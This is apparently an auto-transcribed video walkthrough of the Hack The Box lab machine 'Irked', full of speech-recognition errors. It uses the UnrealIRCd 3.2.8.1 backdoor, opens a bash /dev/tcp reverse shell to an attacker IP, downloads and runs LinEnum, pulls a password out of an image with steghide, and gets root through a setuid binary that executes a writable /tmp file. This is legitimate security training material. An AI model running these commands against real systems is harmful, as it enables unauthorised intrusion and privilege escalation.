 what's going on YouTube this is hip ii will get me doing worked from hack the box which was a easy box in the first step involves finding a back door IRC server this happened back in I think 2009 most people probably just ran the Metasploit module after discovering it but will manually enumerate IRC discover the version it is and then read about the backdoor and exploit it manually once you get a low profile in the box there is a hint on the box that points you towards steganography you do that and you get a low price word you SSH in and then there is a cent UID executable that is relatively easy to exploit so with all that being said let's just jump in like every other box we start off the N maps are - SC for default scripts as V enumerate versions Oh a output all formats put the end map direct and call it earth and then the IP address which is 10 10 10 117 does take some time to run so I've already ran it look at the results we have just three ports open ssh on port 22 and it's running debian HTTP on port 80 and it's running Apache HTTP D and then we have our PC bind on port 111 and we don't have really any information about this I'm not 100% familiar with this service I know if and I fast is running network file system we've exploited that back on the jail video we'd see another port open as well like port I think 2049 but let's go over and check out what is listening on HTTP so go into 10 10 10 117 and we just get an image and it says IRC is almost working so I'm gonna do a full and map because we have this RPC thing listening which normally I see other ports and then the website also says a hint about IRC so let's do and map - P - 10 10 10 1 1 7 and whenever I do - P - I like doing it - vvv just making it verbose and that says when it discovers an open port so I'm going to go back to the web page wall that runs let's check robots.txt doesn't exist we can try like squiggly root and if a patchy step to do home directories you get this resolved it's not something I see very often it's a old thing so let's just run go buster so go Buster - you HTTP 10 10 10 117 - W forward list it's user share - a buster directory list go Buster word list directory list 2 3 medium text and then we'll do - Oh route file and we'll just call this route log and let this run so while that goes let's just see if we can find any other information about this so we can do slash index dot HTML and we get this page and I'm doing this because this kind of identifies what the webserver is when you don't put anything then it's up to how the web server is configured to determine what the page is and a lot of Linux host it'll automatically add like index dot HTML index dot PHP and other things so trying index dot PHP we don't get anything we could try index dot aspx and we can also try like default dot aspx which are defaults and windows which probably wouldn't happen because well again this says it is a Debian toast so going back do we have anything else it doesn't look like we have anything yet there is a slash manual so let's go check what that is so if we go to slash manual we just get the default Apache documentation so nothing too interesting there the copyright is 2014 which may indicate this is old but I guess we will just keep on waiting and right when I got we do see port 80 67 is open so let's go check what that is open up a new pane and then we'll just do nmap - SCS V - P 80 67 10 10 10 1 1 7 and see if n map comes back with anything while that happens I'm going to manually look at this with netcat so we do mcat 10 10 10 1 1 7 and all we see is a map says the ports open and it is IRC with unreal ircd so if we go to port 80 67 we do see th TB notice off looking up your host name so the very first thing I do is let's edit our host file and put that host name there so that's VI at sea house and then we do 10 10 10 1 1 7 earth htb save that go to firefox h TB to see if there's any virtual host routing doesn't look like it so we continue on and poking at this IRC server i want to see what the banner information is for this so i'm gonna do net cat 10 10 10 1 1 780 67 and we have to first look up how to talk I or C so I'm just gonna Google RFC IRC and pull up our SC 1914 59 this one may also work I don't know what the difference between those two is ninety three versus two thousand we'll just do the first one probably should read both of them but this will tell us exactly how to do connections so we have connection registration and we see we send it to password message the NIC message and then the user message so it first comes pass and then a password then Nick and a nickname and if we want we can put a hop count this means optional and then we have a user message with username host name server name realm name and host name and server name aren't trusted by the server I think it says that somewhere if we search first name to highlight this note that Hearst name server name were normally ignored by IRC for reasons but you have to put them so let's do this so we'll do neck cut that port 80 67 would do password of if sac user of if sec and then actually I screwed that up pass it Zach Nick if sec and now we have to do the user command so that was user a hostname or server name and a rel name so we'll do user if sac the host name will be please subscribe and we'll call the server and comment and then the rel name and if you look at the RFC you need a colon the rel name we'll just call this hip sac and now we get the IRC server talking back to us and we can see welcome to rocks net IRC server epic epic here's the password your host is tht be running version unreal three point two point eight point one and we see the server was created Monday May 14 2018 and if we go to Google we can probably just google unreal IRC and look at when this released so unreal IRC changelog put the version in and right away we get a bunch of proof of concepts when we were just looking for a release date so if we go back to our box I'm gonna open new pane and do search point IRC Oh do unreal and we can see unreal ircd backdoor command execution and Metasploit so if you google around for probably unreal IRC backdoor let's see there should be a page that describes this and we can see around November 10th 2019 a backdoored version got pushed up to some repository and then it got pushed into the gen to build the back doors just got disguised to look like a debug code statement as we can see this is what the backdoor was and it looks like it's just doing something and then printing a debug log but debug mode three underscore info was defined to a B and then debug log was defined to system so what this is doing is saying hey if the buffer begins with a B pass it over to system and execute the buffer so we could go and do it through Metasploit but we already have enough information so let us just open a new pane do TCP dump I ton zero ICMP and then let's do ping - c1 1 27001 that is the correct syntax I always get - see and - that mixed up between Linux and windows so letÂ´s do echo a B and then we'll do paying ten ten fourteen I think I'm - if config time zero I am three and we have to put - c1 and then pipe that - netcat 10 10 10 1 1 7 and the port I think was 80 67 let's go back to the previous pane it is 80 67 hit enter and let's see if it actually works do we have to enter our host name and everything nope after that times out we do get a reply saying hooked initiated a ICMP requests to us my boxes host name is HT B so that's why we saw that normally I had I add - n to not do this DNS resolution but in this case it's easy to see that we do have command execution so let us get a reverse shell would do netcat l v NP port wanted to do something fancy but we'll just do 9001 and then up here let's send us a shell so bash - i that whatever that's called dev tcp 10 10 14 3 4 do port 9000 1 and then close it all off and that looks fine and give this time to time out we can put the neck here just in case it wants it but I know it doesn't we just wait for the hostname look up to timeout and we didn't get a shell let's try putting this within bash - see so we'll do bash - see chosen case system is linked to then SH or - or something that doesn't have this feature and that looks like the case so there are multiple shells on Linux you got a stripped down one then you got bashed you got zsh you got a bunch of them so this is a bash thing so that's why made sure I was in a bash shell before you execute that command so let us now upgrade a show to a proper TTY so Python - C import PT y PT y dot spawn bin - and then we'll background this with ctrl Z hit F then s a TTY raw - echo then hit F G enter and then hit enter again and now we're at a shell and I'm just going to do export term is equal to X term so now I can clear the screen and we can begin numerating this box so the first thing we do look at my directory home ircd unreal so let's do LS LA and we don't really have anything we do have a bash history file so let's look at this and we just have stuff in keys I've got a user DJ Murdoch so let's go into home DJ murdered of and we could also look at you name - a to see when this colonel was compiled 2018 zero five zero eight which is probably around the time this box was released so I'm guessing a kind of risk isn't intended so let's look in this home directory fine dot LS we get permission denied in places let's do - type F to only show files and that doesn't look like it only showed files I thought that would but we have documents and then user dot txt which we can't read because we had not this user we can see this guy has read write execute just read right to it then the group and everyone else doesn't have anything so we can't read user dot txt but we can go into this backup directory which isn't a directory that is a file so let's cat that and we see super elite stag backup PW up up down down left right left right ba ba SSSs oh that's probably a select start and that I think is the I think it was contra for the unlimited life or it's called the Konami code I believe but I digress let us just go and think of what's dead could be there's only been one image this whole box and that was on the home page so I am going to download this so let's copy this URL and then go back up here and I just ctrl C my she'll probably nope it back rounded it sweet so we can do curl that URL - oh okay jpg and then gave us a password to do so let's copy this and try stag hide so stag hide what having on my box I don't even have it on my box apt install stag hide and this is just one of the most common steganography used in CTF so I always start with stag hide when I do something especially if it says there's a password now that its installed we can do stag hi - H - - help and see how to do this so - - - SF is stager file and - P is passphrase so we'll do stag hide extract - SF and then jpg - P and the password wrote extracted data - passed our text so if we look at past our text we have a weird string I'm just going to try to SSH with it it's not base64 because we have this : we found it in a home directory so that's the user I'm going to use so we'll do SSH DJ murdered of at 10 10 10 117 yes and then paste the password and we get logged in so now on this box let us do LS la and see if we have anything obvious to do before we go and run like linen oom so obviously we can go into the desktop where is it there's user dot text somewhere here find grip - I use it our text the lazy way to do it and it send documents so we can do WC - C user dot txt it's 30 30 characters which is just an md5 sum so I'm not going to open that I do see a SSH directory nothing is in this directory there's any other home user on this box there isn't I can't get into route if we go to verge of dub dub let's see if in HTML is writable by anyone I know it's not going to be the case for this box but there was a relatively recent Apache exploit carpe diem that I love to show but doesn't look like it's applicable because we can't write into a web directory there is index cold so let's look at that this looks like it's just the default page so it is going to be time to do a linen um so looked at all the common things let's just kill that pain start a new one and I think it's opt linen oom so do Python - see Python - em simple HTTP server and we can just curl 10 10 14 3 port 8000 Lynne a new message pipe it over to bash curl is not here let's do W get we're not in a writable directory so let's go to one and do W get 10 10 10 over 10 10 14 3 4 8,000 when a new message and then we'll execute that I'm sure there's an elegant way to do that with W get without saving it to a disk but oh well I don't care and looking at the results let's just go over to the beginning and see if we see anything and we probably should have checked sudoers honestly and groups so there's a lot of things we forgot the check but this will luckily check it for us so who else is logged in no one group memberships passwd routes a super user account files owned by us I don't care about that hidden files I don't really care about that home directory stuff don't care about that let's see can I just switch by this lets do I know there's a way to do that but oh well path animation available shells so doesn't look like we found anything too interesting yet endocrine system D timers networking info learning processes binaries permissions associated those software Apache user home directory for patchy let's see we have anything is su ID here so as to ad files and to stick out right away the two that stick out or the ones done in 2018 it's exam four which I know is a mail server so it's not that interesting but users have been view it definitely interesting and that is done on May 16th so let's go take a look at that so I just scrolled down because I was curious what I thought was potentially interesting where is view user I am not familiar with this binary so let's see what it is so if we do LS LA on it and we get its own by root it's a set UID binary so let's execute it with view user and we get this application is being developed to set and test user permissions and a file is not found temp list users so I'm going to do I don't have L trace or s trace on it so let's copy this back to our Kelly box so I forget what the password is for this user I'm lazy so I'm just gonna base64 it I'm guessing it's not too big and I want - W 0 to get rid of line wrapping and let's copy it it's now in my clipboard so we can do view user dot b64 paste Ron clipboard paste it base64 - D view user and send that to the file chmod plus x and we probably should open up and I you know Aggie job but I don't have those installed and I'm lazy so let's just do s trace on view user and see if we can get an idea of what it's doing and this is just going to list all the SIS calls and we can see let's see what it's doing maybe L Trace would be a better one to do okay yeah hello trace is a bit easier to read so we have the put statements saying this application is still being developed then we get it running system whoo and we don't see it using a full path here so we may have code execution right there and then we also get set UID 0 system and then executing this file so let us copy this let's go back to the box V edit this file let's just put been bash and then is that the correct order or is it no it's I can't even remember what the correct order if that is pretty sure it's this and then do bend bash and chmod plus x to make it executable and now if we execute tamp list user we get a bash shell which is fine so let's now do view user and view users gonna execute what we just did to get a shell and to make it a bit more clear let's just do echo sending a shell we'll do root shell so that should make it clear what's happening so let's do view user hey caps lock enter and now we see it is sending us the root shell and we're root at earth so if we go into / root we can do WCC root dart text and we got past dot text which I guess is the same password as the home user I don't think that's roots password I'm gonna be sad because we did not try that so let's do su put the password not allowed we can do sudo - L sudo is not found and the last thing I want to do was look at if we could also execute this where is it whose statement so it's running system whoo and I don't see the full path it should be user bin whoo so let's export path is equal to dev SH M and then path I think that's correct that go path it is so now we can do V who do the same thing and we'll do echo sending root shell echo blank line echo blank line echo who hijacked I could really type hole my god and now we can finally just execute then SH or we can do bash to keep it what we have been so chmod plus x 2 and let's RM temp what was it whisked user okay so now when we run view users we still get it and we did not prove esque Oh because the set UID calls or after this so it's not vulnerable because it does who and then it does the set UID call to make itself root and does this system call so that's why when we hijacked it we didn't get anything but when we just do it down here we did hopefully that makes sense it's all because of that set UID call so that is the box and this video went quick and I imagined so I guess we can go and do the key drug I draw however you pronounce it - look at this binary it should be relatively simple so let's go to Firefox and just Google download deidre and then we want to do the website not to github depository and download this don't see when this finishes it looks like it's going relatively quick now that it's done let's go to terminal go to opt and then we can just unzip what's in downloads and then we'll rename it to get rid of that version because I really hate having there's that version information in my directories just a little OCD thing I guess so move and then let's get rid of that go in and then run it click I agree and then we should create the project we don't need this help thing hopefully we don't need it the last time I did this was in the mini cats video I think one of the windows videos where we set up command a VM so give it a directory name so that's root htb boxes but we'll just call this view user II and that is actually the project name and then click on this little code browser and back my ID in commando I think that's what the first time I've ever used this so this will probably be the second time I've used this program first time it was impressive so we'll see if it keeps that up so open project no import file I think that's what we want htb boxes worked is down here and we want view user discovered it as an elf 32-bit has not been analyzed let's analyze it and select all and then click go so don't really have anything let's go over to functions go to main and we can see the decompiler did a really good job at showing us exactly what it's doing it's doing a puts this application is being developed an answering system who set you ID system return 0 so we can look at the assembly code which is how we have been doing it and we can see let's see it's loading the effective address into EAX and then pushing it and then calling puts and then we do what this does is yeah X is used as I guess like an argument so we load the string into EAX and then we're pushing it we're pushing it to the stack and because this is a 32-bit binary these arguments pull from the stack in order and instead of 64-bit where they go in order of the registers ODI then RSI then RDX then RCX then r8 and then finally r9 so 64-bit programs have six registers dedicated arguments whereas 32 bits just generally push it to the stack so we see the put statement which then puts this over to your screen and now we're loading the next one which is it is actively being developed and then does a puts and then loads who which is just W right here in comments but flirting that and calling system and then we do another one to do set UID and then we do system after we load to do West users so the decompiler worked pretty darn well and if you wanted to get the call graph I think that button is right here this may be more used to what you're saying if the other format if that intimidates you sometimes this is easier to read but that's the Box hope you guys enjoyed it take care and I'll see you all next week